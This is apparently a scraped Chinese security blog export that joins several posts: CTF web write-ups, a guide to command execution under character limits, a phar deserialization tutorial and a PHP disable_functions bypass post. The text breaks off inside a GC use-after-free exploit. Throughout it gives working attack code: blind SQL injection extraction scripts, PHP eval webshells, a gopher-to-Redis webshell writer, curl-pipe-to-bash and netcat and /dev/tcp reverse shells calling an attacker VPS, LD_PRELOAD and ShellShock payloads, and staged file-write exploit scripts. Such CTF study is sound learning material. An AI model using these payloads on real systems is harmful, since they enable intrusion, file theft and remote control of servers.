\"if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273 ),%d,1))&gt;%d,1,-1)%%23\"%(i,mid) payload = \"if(ascii(substr((select group_concat(password) from users),%d,1))&gt;%d,1,-1)%%23\"%(i,mid) #print(url+payload) r = requests.get(url+payload) if b\"JFIF\" in r.content : head = mid + 1 else: tail = mid last = result if chr(head)!=' ' : result += chr(head) print(result) 这里会将文件名和用户名写入日志文件。但是这里日志文件为php格式，考虑写入shell。由于用户名只能为admin无法利用，考虑文件名注入。文件名进行了php/i过滤，可以使用短标签绕过： 1filename=\"&lt;?=@eval($_POST['a']);?&gt;\" 这个文件名，会被写入日志文件中去，然后用菜刀连接。 [FBCTF2019]RCEServicejson属性字段一定要用双引号括起来，单引号是不可以的。 https://xz.aliyun.com/t/5399 123456789101112131415161718192021222324&lt;?phpputenv('PATH=/home/rceservice/jail');if (isset($_REQUEST['cmd'])) &#123; $json = $_REQUEST['cmd']; if (!is_string($json)) &#123; echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'; &#125; elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/', $json)) &#123; echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'; &#125; else &#123; echo 'Attempting to run command:&lt;br/&gt;'; $cmd = json_decode($json, true)['cmd']; if ($cmd !== NULL) &#123; system($cmd); &#125; else &#123; echo 'Invalid input'; &#125; echo '&lt;br/&gt;&lt;br/&gt;'; &#125;&#125;?&gt; 但是他用的是preg_match()函数，只匹配一行，用个换行符搞定 1?cmd=&#123;%0A\"cmd\": \"ls /\"%0A&#125; 并没有flag 在这里插入图片描述这里提供了路径，暂时明白为啥可以ls了，因为ls的二进制文件放在这个目录下了 看看这个路径都有啥 1?cmd=&#123;%0A\"cmd\": \"ls /home/rceservice\"%0A&#125; 发现flag 1?cmd=&#123;%0A\"cmd\":\"/bin/cat%20/home/rceservice/flag\"%0A&#125; [GKCTF2020]EZ三剑客-EzWeb查看源码，提示 ?secret,访问得一些 ip 信息 1234567891011121314151617181920212223eth0 Link encap:Ethernet HWaddr 02:42:0a:dd:75:09 inet addr:10.221.117.9 Bcast:10.221.117.255 Mask:255.255.255.0 UP BROADCAST RUNNING MULTICAST MTU:1450 Metric:1 RX packets:138 errors:0 dropped:0 overruns:0 frame:0 TX packets:137 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:29124 (29.1 KB) TX bytes:29110 (29.1 KB)eth1 Link encap:Ethernet HWaddr 02:42:ac:12:00:3b inet addr:172.18.0.59 Bcast:172.18.255.255 Mask:255.255.0.0 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:85 errors:0 dropped:0 overruns:0 frame:0 TX packets:27 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:21931 (21.9 KB) TX bytes:1640 (1.6 KB)lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:34 errors:0 dropped:0 overruns:0 frame:0 TX packets:34 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:2927 (2.9 KB) TX bytes:2927 (2.9 KB) 得知有srrf漏洞，file://协议被过滤了，用发现file协议被过滤了，我们可以尝试绕过：file：/、file:&lt;空格&gt;/// 12?url=file:/var/www/html/index.php?url=file:%20///var/www/html/index.php 得知index.php漏洞 1234567891011121314151617181920212223&lt;?phpfunction curl($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); echo curl_exec($ch); curl_close($ch);&#125;if(isset($_GET['submit']))&#123; $url = $_GET['url']; //echo $url.\"\\n\"; if(preg_match('/file\\:\\/\\/|dict|\\.\\.\\/|127.0.0.1|localhost/is', $url,$match)) &#123; //var_dump($match); die('鍒繖鏍�'); &#125; curl($url);&#125;if(isset($_GET['secret']))&#123; system('ifconfig');&#125;?&gt; bp跑一下 10.55.109.9 c 段主机，跑一下 10.55.109.11的端口，或直接试一试常见的端口6379/3306后面就直接写shell 12345678910111213141516171819202122232425262728293031import urllibprotocol=\"gopher://\"ip=\"10.55.109.11\"port=\"6379\"shell=\"\\n\\n&lt;?php system('cat /flag');?&gt;\\n\\n\"filename=\"shell.php\"path=\"/var/www/html\"passwd=\"\"cmd=[\"flushall\", \"set 1 &#123;&#125;\".format(shell.replace(\" \",\"$&#123;IFS&#125;\")), \"config set dir &#123;&#125;\".format(path), \"config set dbfilename &#123;&#125;\".format(filename), \"save\" ]if passwd: cmd.insert(0,\"AUTH &#123;&#125;\".format(passwd))payload=protocol+ip+\":\"+port+\"/_\"def redis_format(arr): CRLF=\"\\r\\n\" redis_arr = arr.split(\" \") cmd=\"\" cmd+=\"*\"+str(len(redis_arr)) for x in redis_arr: cmd+=CRLF+\"$\"+str(len((x.replace(\"$&#123;IFS&#125;\",\" \"))))+CRLF+x.replace(\"$&#123;IFS&#125;\",\" \") cmd+=CRLF return cmdif __name__==\"__main__\": for x in cmd: payload += urllib.request.quote(redis_format(x)) print(urllib.request.quote(payload)) # 由于我们这里是GET，所以要进行两次url编码 在访问，即可得flag 1url=http://10.55.109.11:80/shell.php [BJDCTF 2nd]elementmaster506F2E706870 hextotext得到Po.php结果是And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php，进去就能得到flag [网鼎杯 2018]Comment已经提示用户名和密码了，弱密码登录（得自己去爆破）zhangwei666即可.git泄露，Git_Extract恢复一下 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpinclude \"mysql.php\";session_start();if($_SESSION['login'] != 'yes')&#123; header(\"Location: ./login.php\"); die();&#125;if(isset($_GET['do']))&#123;switch ($_GET['do'])&#123;case 'write': $category = addslashes($_POST['category']); $title = addslashes($_POST['title']); $content = addslashes($_POST['content']); $sql = \"insert into board set category = '$category', title = '$title', content = '$content'\"; $result = mysql_query($sql); header(\"Location: ./index.php\"); break;case 'comment': $bo_id = addslashes($_POST['bo_id']); $sql = \"select category from board where id='$bo_id'\"; $result = mysql_query($sql); $num = mysql_num_rows($result); if($num&gt;0)&#123; $category = mysql_fetch_array($result)['category']; $content = addslashes($_POST['content']); $sql = \"insert into comment set category = '$category', content = '$content', bo_id = '$bo_id'\"; $result = mysql_query($sql); &#125; header(\"Location: ./comment.php?id=$bo_id\"); break;default: header(\"Location: ./index.php\");&#125;&#125;else&#123; header(\"Location: ./index.php\");&#125;?&gt; 可以发现当do=write的时候，传入的信息都会进行转义，但是数据库会自动清除反斜杠，当do=comment的时候，可以发现直接从category这个字段进行查询，这就导致了二次注入所以说那个转义函数根本起不到防护的作用。要在第一步的时候插入 1category=1’,content=user(),/* 在第二步的时候留言 1content=*/# 这样插入数据库中的留言就会变成 1234insert into comment set category = '1',content=user(),/* content = '*/#', bo_id = '$bo_id' 这里注意一下 # 注释一行 /**/注释多行 看到是 root 用户，一般 flag 就不会在数据库里面(因为如果在数据库中，不需要这么高的权限，实际也确实没有)，应该是要用 SQL语句 读取flag文件了。 首先读取 /etc/passwd 看看服务器上有哪些用户，payload为: 1’,content=(select load_file(‘/etc/passwd’)),/*发现 www 用户的一些操作。看见有 .DS_Store 文件，考虑到目标环境是docker，所以 .DS_Store 文件应该在 /tmp 中。而 .DS_Store 文件中，经常会有一些不可键字符，所以我们可以使用hex函数对其内容进行转换，payload为： ‘,content=(select hex(load_file(‘/tmp/html/.DS_Store’))),/*得知flag文件名 11',content=(select hex(load_file('/var/www/html/flag_8946e1ff1ee3e40f.php'))),/* [BJDCTF 2nd]duangShellvim编辑一个文件产生的临时文件，处理不当有可能造成泄露。其泄露方式为文件名.swp 有些时候文件名前会有一个点.。然后获得这个.swp文件后，在Linux里通过命令 vim -r xxx.swp 来让临时文件恢复正常 12345678910111213141516171819&lt;?phperror_reporting(0);echo \"how can i give you source code? .swp?!\".\"&lt;br&gt;\";if (!isset($_POST['girl_friend'])) &#123; die(\"where is P3rh4ps's girl friend ???\");&#125;else &#123; $girl = $_POST['girl_friend']; if (preg_match('/\\&gt;|\\\\\\/', $girl)) die('just girl'); else if (preg_match('/ls|phpinfo|cat|\\%|\\^|\\~|base64|xxd|echo|\\$/i', $girl)) &#123; echo \"&lt;img src='img/p3_need_beautiful_gf.png'&gt; &lt;!-- He is p3 --&gt;\"; &#125; else &#123; exec($girl); //duangShell~~~~ &#125; &#125;?&gt; 本题的RCE绕过poc1：通过 curl url获得某个网址的某个文件的内容，再通过管道符转移给bash处理,如:curl url/shell.txt|bash shell.txt里是要执行的命令，本题建议在shell.txt里放反弹shell指令poc2:监听命令攻击机 1nc -lvvp port 靶机上执行 1nc vpsip port -e /bin/bash 用find / -name flag 寻找flag [BJDCTF 2nd]Schrödinger应该是输入文件，对其进行check后删除，正好符合前面提示要求的删除的test.php输入 http://5612956a-2228-4ed1-99ae-3039a69fa7d1.node3.buuoj.cn/test.php 点击input，发现页面发生了变化点击check并抓包看到有base64编码，解码后发现是时间戳，将其修改为0，然后Forwardb站视频的av号，去翻一下评论即可得到flag [CISCN2019 华北赛区 Day1 Web5]CyberPunk查看源码发现最底下有个提示，说明可能存在文件包含 用filter伪协议读出所有可以找到的页面和文件的源码，整理一下， 开始分析可能存在的漏洞 confirm.php存储 address 字段的值，change.php 又拿出来使用，导致 二次注入 121' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,20)),0x7e),1)#1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),21,40)),0x7e),1)#","categories":[],"tags":[]},{"title":"有限字符下的命令执行","slug":"有限字符下的命令执行","date":"2020-12-28T15:37:15.000Z","updated":"2021-01-05T03:10:44.315Z","comments":true,"path":"article/141bd5ee.html","link":"","permalink":"https://blog.cfyqy.com/article/141bd5ee.html","excerpt":"命令执行的字符限制绕过","text":"命令执行的字符限制绕过 转载 CTF相关知识点有限字符下的任意命令执行总结 15位可控字符12345678&lt;?phphighlight_file(__FILE__);if(strlen($_GET[1])&lt;15)&#123; echo strlen($_GET[1]); echo shell_exec($_GET[1]);&#125;else&#123; exit('too long');&#125; 因为只能传入14个字符，但是没有限制命令执行的次数，所以我们的思想可以通过Linux下的&gt;符号与&gt;&gt;符号写入一段一句话木马到指定文件。 12345&lt;?phpeval($_GET[1]); 经测试上述这样的一句话木马（经过换行）是可以命令执行的，所以我们可以通过传参构造出这样的一句话木马，不断传入以下Payload： 123456echo \\&lt;?php&gt;1echo eval\\(&gt;&gt;1echo \\$_GET&gt;&gt;1echo \\[1\\]&gt;&gt;1echo \\)\\;&gt;&gt;1mv 1 1.php 7位可控字符123456789101112&lt;?php highlight_file(__FILE__);if(strlen($_GET[1]&lt;=7))&#123; echo strlen($_GET[1]); echo '&lt;hr/&gt;'; echo shell_exec($_GET[1]);&#125;else&#123; exit('too long');&#125; ?&gt; 知识点 12345&gt;a #虽然没有输入但是会创建a这个文件ls -t #ls基于基于事件排序（从晚到早）sh a #sh会把a里面的每行内容当作命令来执行使用\\进行命令拼接 #l\\ s = lsbase64 #使用base64编码避免特殊字符 目标，写入语句“&lt;?php eval($_GET[1]);”，base64编码后“PD9waHAgZXZhbCgkX0dFVFsxXSk7” 需要被执行的语句是：“echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php”payload.txt 1234567891011121314151617181920&gt;hp&gt;1.p\\\\&gt;d\\&gt;\\\\&gt;\\ -\\\\&gt;e64\\\\&gt;bas\\\\&gt;7\\|\\\\&gt;XSk\\\\&gt;Fsx\\\\&gt;dFV\\\\&gt;kX0\\\\&gt;bCg\\\\&gt;XZh\\\\&gt;AgZ\\\\&gt;waH\\\\&gt;PD9\\\\&gt;o\\ \\\\&gt;ech\\\\ls -t&gt;0sh 0 exp.py 1234567891011121314import requests target_url=\"http://192.168.1.101\"url = target_url+\"/command.php?1=&#123;&#125;\"print(\"[+]start attack!!!\")with open(\"payload.txt\",\"r\") as f: for i in f: print(\"[*]\" + url.format(i.strip())) requests.get(url.format(i.strip())) #检查是否攻击成功test = requests.get(target_url+\"/1.php\")if test.status_code == requests.codes.ok: print(\"[*]Attack success!!!\") 攻击完后生成1.php 5位可控字符1234567891011&lt;?php $sandbox = '/var/www/html/sandbox/' . md5(\"orange\" . $_SERVER['REMOTE_ADDR']); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET['cmd']) &amp;&amp; strlen($_GET['cmd']) &lt;= 5) &#123; @exec($_GET['cmd']); &#125; else if (isset($_GET['reset'])) &#123; @exec('/bin/rm -rf ' . $sandbox); &#125; highlight_file(__FILE__);?&gt; 知识点： 输入通配符 * ，Linux会把第一个列出的文件名当作命令，剩下的文件名当作参数 通过rev来倒置输出内容（rev命令将文件中的每行内容以字符为单位反序输出） 用dir来代替ls不换行输出；rev将文件内容反向输出；在用ls时，写到a时每个文件名都是单独一行 123&gt;revecho 1234 &gt; v*v （等同于命令：rev v 两种利用方式： 反弹shell: 一种是curl服务起上写好的文件，进行反弹Shell， 写马：写入一句话木马 详细的解释参看https://www.freesion.com/article/8743881775/ 1echo$&#123;IFS&#125;PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 ‐d&gt;1.php 那么我们只需要将上面的代码拆分倒序输入到主机即可。我们需要让sh先执行a文件（ls -th &gt;f）就会得到f文件，最后再让sh去执行f文件即可得到1.php。最终payload如下payload.txt 123456789101112131415161718192021222324252627282930313233343536373839404142434445&gt;dir&gt;f\\&gt;&gt;ht-&gt;sl*&gt;v&gt;rev*v&gt;a&gt;hp&gt;p\\\\&gt;1.\\\\&gt;\\&gt;\\\\&gt;-d\\\\&gt;\\ \\\\&gt;64\\\\&gt;se\\\\&gt;ba\\\\&gt;\\|\\\\&gt;7\\\\&gt;Sk\\\\&gt;X\\\\&gt;x\\\\&gt;Fs\\\\&gt;FV\\\\&gt;d\\\\&gt;X0\\\\ &gt;k\\\\&gt;g\\\\&gt;bC\\\\&gt;h\\\\&gt;XZ\\\\&gt;gZ\\\\&gt;A\\\\&gt;aH\\\\&gt;w\\\\&gt;D9\\\\ &gt;P\\\\&gt;S&#125;\\\\&gt;IF\\\\&gt;&#123;\\\\&gt;\\$\\\\&gt;o\\\\&gt;ch\\\\&gt;e\\\\sh ash f exp.py 12345678910111213import requests target_url=\"http://192.168.1.101\"url = target_url+\"/command.php?cmd=&#123;&#125;\"print(\"[+]start attack!!!\")with open(\"payload.txt\",\"r\",encoding=\"utf-8\") as f: for i in f: print(\"[*]\" + url.format(i.strip())) requests.get(url.format(i.strip()))test = requests.get(target_url+\"/sandbox/fec93fd8e80b1dce1c81d832dc43fa40/1.php\")if test.status_code == requests.codes.ok: print(\"[*]Attack success!!!\") 在本地实验中用sh失败了，用bash成功，不知道啥原因 四位可控字符与之前的5位是一样的，经测试构造的payload.txt内容去掉了一个\\也可以成功输出1.phppayload.txt 123456789101112131415161718192021222324252627282930313233343536373839404142434445&gt;dir&gt;f\\&gt;&gt;ht-&gt;sl*&gt;v&gt;rev*v&gt;a&gt;hp&gt;p\\&gt;1.\\&gt;\\&gt;\\&gt;-d\\&gt;\\ \\&gt;64\\&gt;se\\&gt;ba\\&gt;\\|\\&gt;7\\&gt;Sk\\&gt;X\\&gt;x\\&gt;Fs\\&gt;FV\\&gt;d\\&gt;X0\\&gt;k\\&gt;g\\&gt;bC\\&gt;h\\&gt;XZ\\&gt;gZ\\&gt;A\\&gt;aH\\&gt;w\\&gt;D9\\&gt;P\\\\&gt;S&#125;\\&gt;IF\\&gt;&#123;\\&gt;\\$\\&gt;o\\&gt;ch\\&gt;e\\sh ash f 三位可控字符来自CTFSHOW平台的【nl】难了 一题 12345678910&lt;?phpshow_source(__FILE__);error_reporting(0);if(strlen($_GET[1])&lt;4)&#123; echo shell_exec($_GET[1]);&#125;else&#123; echo \"hack!!!\";&#125;?&gt; 只存在s开头的和z开头的文件，Linux中文件排序按照26个英文字母顺序排放，所以我们依然利用前几种字符限制的方法，通过&gt;写入一个以命令名命名的文件，如:nl（读取文件带上行）od（八进制显示输出），但这样的命令前提是其第一个字母必须在当前文件名中排到第一位。 payload: 12?1=&gt;nl ?1=*或?1=*&gt;z ?1=&gt;od ?1=* 上图是传入nl后ls当前目录下的内容，接下来再传入?=*的时候就会在源代码中得到flag。参考文章： CTF相关知识点有限字符下的任意命令执行总结 【CTF 攻略】如何绕过四个字符限制getshell","categories":[],"tags":[],"author":"ye1s"},{"title":"phar反序列化学习","slug":"phar反序列化学习","date":"2020-12-28T15:28:03.000Z","updated":"2021-04-23T09:10:43.732Z","comments":true,"path":"article/a8d2a8d3.html","link":"","permalink":"https://blog.cfyqy.com/article/a8d2a8d3.html","excerpt":"phar反序列化就是可以在不使用php函数unserialize()的前提下，进行反序列化，从而引起的严重的php对象注入漏洞。","text":"phar反序列化就是可以在不使用php函数unserialize()的前提下，进行反序列化，从而引起的严重的php对象注入漏洞。 原理phar文件结构四部分构成 stub：phar文件标识，前面内容不限，但必须以 __HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件 manifest：压缩文件的属性等信息，以序列化的形式存储自定义的meta-data。 contents：压缩文件的内容 signature：签名，在文件末尾 缘由漏洞触发点在使用phar://协议读取文件的时候，文件内容会被解析成phar对象，然后phar对象内的Metadata信息会被反序列化。当内核调用phar_parse_metadata()解析metadata数据时，会调用php_var_unserialize()对其进行反序列化操作，因此会造成反序列化漏洞。 利用利用条件利用条件: phar文件要能够上传到服务器端。 要有可用的魔术方法作为“跳板”。 文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。 有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下： 生成文件根据文件结构我们来自己构建一个 phar 文件，php内置了一个 Phar 类来处理相关操作 注意：要将 php.ini 中的 phar.readonly 选项设置为Off，否则无法生成 phar 文件。 phar.php: 12345678910111213&lt;?php class TestObject &#123; &#125; $phar = new Phar(\"phar.phar\"); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //设置stub $o = new TestObject(); $o -&gt; data='hu3sky'; $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering();?&gt; 生成phar.phar文件 可以明显的看到meta-data是以序列化的形式存储的。 1234567891011121314&lt;?php class TestObject &#123; &#125; @unlink(\"phar.phar\"); $phar = new Phar(\"phar.phar\"); $phar-&gt;startBuffering(); $phar-&gt;setStub(\"GIF89a\".\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //设置stub，增加gif文件头 $o = new TestObject(); $phar-&gt;setMetadata($o); //将自定义meta-data存入manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering();?&gt; 可以看到加了GIF89a文件头，从而使其伪装成gif文件：生成文件后，可以修改为任意后缀。 例题[SWPUCTF 2018]SimplePHPclass.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;?phpclass C1e4r&#123; public $test; public $str; public function __construct($name) &#123; $this-&gt;str = $name; &#125; public function __destruct() &#123; $this-&gt;test = $this-&gt;str; echo $this-&gt;test; &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file) &#123; $this-&gt;source = $file; //$this-&gt;source = phar://phar.jpg echo $this-&gt;source; &#125; public function __toString() &#123; $content = $this-&gt;str['str']-&gt;source; return $content; &#125; public function __set($key,$value) &#123; $this-&gt;$key = $value; &#125; public function _show() &#123; if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this-&gt;source)) &#123; die('hacker!'); &#125; else &#123; highlight_file($this-&gt;source); &#125; &#125; public function __wakeup() &#123; if(preg_match(\"/http|https|file:|gopher|dict|\\.\\./i\", $this-&gt;source)) &#123; echo \"hacker~\"; $this-&gt;source = \"index.php\"; &#125; &#125;&#125;class Test&#123; public $file; public $params; public function __construct() &#123; $this-&gt;params = array(); &#125; public function __get($key) &#123; return $this-&gt;get($key); &#125; public function get($key) &#123; if(isset($this-&gt;params[$key])) &#123; $value = $this-&gt;params[$key]; &#125; else &#123; $value = \"index.php\"; &#125; return $this-&gt;file_get($value); &#125; public function file_get($value) &#123; $text = base64_encode(file_get_contents($value)); return $text; &#125;&#125;?&gt; exp 123456789101112131415161718192021222324252627282930313233&lt;?phpclass C1e4r&#123; public $test; public $str;&#125;class Show&#123; public $source; public $str;&#125;class Test&#123; public $file; public $params;&#125;$test=new Test();$show=new Show();$c1e4r=new C1e4r();$c1e4r-&gt;str=$show;$show-&gt;str['str']=$test;$test-&gt;params['source']='/var/www/html/f1ag.php';$phar = new Phar(\"phar1.phar\");$phar-&gt;startBuffering();$phar-&gt;setStub(\"GIF89a\".\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //设置stub，增加gif文件头$phar-&gt;setMetadata($c1e4r); //将自定义meta-data存入manifest$phar-&gt;addFromString(\"test.txt\", \"test\"); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt; 上传后 1&#x2F;file.php?file&#x3D;phar:&#x2F;&#x2F;upload&#x2F;19b39eddec74b32461a3673dea6b7871.jpg 参考文章： Phar反序列化浅析：https://www.extrader.top/posts/bb56c28a/","categories":[],"tags":[],"author":"ye1s"},{"title":"Bypasss Disable_function ","slug":"Bypasss-Disable-function","date":"2020-12-27T03:19:00.000Z","updated":"2021-04-25T13:08:49.701Z","comments":true,"path":"article/6124293c.html","link":"","permalink":"https://blog.cfyqy.com/article/6124293c.html","excerpt":"PHP 的 disable_functions 用于禁用一些危险的函数避免被攻击者利用","text":"PHP 的 disable_functions 用于禁用一些危险的函数避免被攻击者利用 disable_function专题： https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions 寻找非过滤函数12345function=\"pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system,putenv\"disable_function=\"eee,tdd\"for i in disable_function.split(\",\"): if i not in function: print(i) LD_PRELOAD LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。 12putenv()：PHP函数，可以设置环境变量mail()，error_log():PHP函数，在运行时会执行系统中的程序：sendmail 大致步骤： 生成一个我们的恶意动态链接库文件 利用putenv设置LD_PRELOAD为我们的恶意动态链接库文件的路径 配合php的某个函数去触发我们的恶意动态链接库文件 RCE并获取flag getflag.c 123456789#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;__attribute__ ((__constructor__)) void angel (void)&#123; unsetenv(\"LD_PRELOAD\"); system(\"/readflag &gt; /tmp/flag.txt\");&#125; 编译成getflag.so 1gcc -shared -fPIC getflag.c -o getflag.so 上传到tmp目录下， 在网站根目录创建shell.php 12345&lt;?Phpputenv(\"LD_PRELOAD=/tmp/getflag.so\");mail(\"\", \"\", \"\", \"\");error_log(\"\",1,\"\",\"\");?&gt; 然后去GET请求包含shell.php url/?ant=include(%27shell.php%27);在tmp目录上生成flag.txt，包含flag，蚁剑记得重新刷新一下目录 ShellShockShellShock,破壳漏洞，出现于2014年利用bash破壳漏洞（CVE-2014-6271），该漏洞存在于bash 1.14 – 4.3版本中https://www.cnblogs.com/qmfsun/p/7591757.html可以通过以下命令来判断是否存在这个漏洞 1env x='() &#123; :;&#125;; echo vulnerable' bash -c \"echo this is a test\" 如果结果中有 vulnerable说明存在这个漏洞，执行了echo vulnerable这个语句。大致原理：bash shell中定义环境变量通过函数名称来调用时，正常情况下是这样在这里插入图片描述但是对于存在shellshock漏洞的环境下，Bash对于环境变量只是检测到函数，并且从’{‘开始执行，但是并没有在’}’后停止，也就是说定义在函数体外shell命令也会执行，所以env x=&#39;() { :;}; echo vulnerable&#39; 输出了vulnerable。 例题：查看phpinfo() 和上题一样还是没有禁用error_log函数。正常情况下蚁剑已经实现通过ShellShock漏洞，直接拿到shell，但是这题不行。上传shell.php，并访问 123456&lt;?php @eval($_REQUEST['ant']); putenv(\"PHP_test=() &#123; :; &#125;; tac /flag &gt;&gt; /var/www/html/flag.txt\"); error_log(\"admin\",1); //mail(\"admin@localhost\",\"\",\"\",\"\",\"\");?&gt; 通过putenv来设置环境变量，默认putenv定义的环境变量名必须以PHP_开头。error_log()函数会在执行sh -c -t -i触发payload Apache Mod CGI需要满足几个条件: 必须是apache环境 mod_cgi已经启用 必须允许.htaccess文件，也就是说在httpd.conf中，要注意AllowOverride选项为All，而不是none 必须有权限写.htaccess文件 例：.htaccess内容： 12Options +ExecCGIAddHandler cgi-script .test #表示.stest后缀的文件都会被当作cgi脚本执行 shell.test 123#!/bin/bashecho -ne \"Content-Type: text/html\\n\\n\"echo&amp;ls 这里没尝试成功,猜测要给shell.test给777权限 注解： Options指令是Apache配置文件中一个比较常见也比较重要的指令，Options指令可以在Apache服务器核心配置(server config)、虚拟主机配置(virtual host)、特定目录配置(directory)以及.htaccess文件中使用。Options指令的主要作用是控制特定目录将启用哪些服务器特性。关于Options指令后可以附加的特性选项的具体作用及含义，可以参考这篇文章：http://www.365mini.com/page/apache-options-directive.htm当然我们用到的就是ExecCGI选项，表示允许使用mod_cgi模块执行CGI脚本 上传shell.php，vps监听端口，访问shell.php,反弹shell 123456789101112131415161718192021222324252627282930313233343536&lt;?php$cmd = \"bash -i &gt;&amp; /dev/tcp/vpsip/port 0&gt;&amp;1\"; //command to be executed$shellfile = \"#!/bin/bash\\n\"; //using a shellscript$shellfile .= \"echo -ne \\\"Content-Type: text/html\\\\n\\\\n\\\"\\n\"; //header is needed, otherwise a 500 error is thrown when there is output$shellfile .= \"$cmd\"; //executing $cmdfunction checkEnabled($text,$condition,$yes,$no) //this surely can be shorter&#123; echo \"$text: \" . ($condition ? $yes : $no) . \"&lt;br&gt;\\n\";&#125;if (!isset($_GET['checked']))&#123; @file_put_contents('.htaccess', \"\\nSetEnv HTACCESS on\", FILE_APPEND); //Append it to a .htaccess file to see whether .htaccess is allowed header('Location: ' . $_SERVER['PHP_SELF'] . '?checked=true'); //execute the script again to see if the htaccess test worked&#125;else&#123; $modcgi = in_array('mod_cgi', apache_get_modules()); // mod_cgi enabled? $writable = is_writable('.'); //current dir writable? $htaccess = !empty($_SERVER['HTACCESS']); //htaccess enabled? checkEnabled(\"Mod-Cgi enabled\",$modcgi,\"Yes\",\"No\"); checkEnabled(\"Is writable\",$writable,\"Yes\",\"No\"); checkEnabled(\"htaccess working\",$htaccess,\"Yes\",\"No\"); if(!($modcgi &amp;&amp; $writable &amp;&amp; $htaccess)) &#123; echo \"Error. All of the above must be true for the script to work!\"; //abort if not &#125; else &#123; checkEnabled(\"Backing up .htaccess\",copy(\".htaccess\",\".htaccess.bak\"),\"Suceeded! Saved in .htaccess.bak\",\"Failed!\"); //make a backup, cause you never know. checkEnabled(\"Write .htaccess file\",file_put_contents('.htaccess',\"Options +ExecCGI\\nAddHandler cgi-script .dizzle\"),\"Succeeded!\",\"Failed!\"); //.dizzle is a nice extension checkEnabled(\"Write shell file\",file_put_contents('shell.dizzle',$shellfile),\"Succeeded!\",\"Failed!\"); //write the file checkEnabled(\"Chmod 777\",chmod(\"shell.dizzle\",0777),\"Succeeded!\",\"Failed!\"); //rwx echo \"Executing the script now. Check your listener &lt;img src = 'shell.dizzle' style = 'display:none;'&gt;\"; //call the script &#125;&#125;?&gt; PHP-FPM详情可看此篇文章：https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html 可用蚁剑 disable_functions 插件绕过会生成 .antproxy.php 文件，密码ant连接 .antproxy.php 文件 GC UAF利用的是PHP garbage collector程序中的堆溢出触发，影响范围为7.0-1.3 使用条件：Linux 操作系统PHP 版本7.0 - all versions to date7.1 - all versions to date7.2 - all versions to date7.3 - all versions to date exp:https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass或者直接蚁剑 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209&lt;?php# Author: https://github.com/mm0r1pwn($_POST[\"pass\"]);function pwn($cmd) &#123; global $abc, $helper; function str2ptr(&amp;$str, $p = 0, $s = 8) &#123; $address = 0; for($j = $s-1; $j &gt;= 